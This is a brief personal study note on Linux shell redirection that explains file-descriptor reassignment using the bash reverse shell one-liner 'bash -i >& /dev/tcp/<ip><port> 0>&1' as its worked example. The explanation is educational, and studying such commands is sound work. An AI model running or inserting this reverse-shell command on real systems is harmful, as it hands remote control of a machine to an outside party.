# redirection in Linux

Redirections in Linux can be interpreted as following:

1. Redirections are run from left to right.
2. `>` is similar to `=`, which is an assignment
3. `&` is close to `$` in bash, which indicates variables

For the example in [[201911041338]],

```bash
bash -i >& /dev/tcp/<ip><port> 0>&1
```

Here are three parts:

1. `bash -i` which is the command to launch new shell
2. `>& /dev/tcp/<ip><port>`, which redirects the stdout of 1 to `/dev/tcp/<ip><port>` as the stdin
3. `0>&1` redirects the stdin as the stdout

The process steps are shown as following:

Initial status of `bash -i`
0=stdin
1=stdout

after `>& /dev/tcp/<ip><port>`

0=stdin
1=(stdin of) `/dev/tcp/<ip><port>` (the stdin is default)

after `0>&1`

0=(stdout of) `/dev/tcp/<ip><port>`
1=(stdin of) `/dev/tcp/<ip><port>`
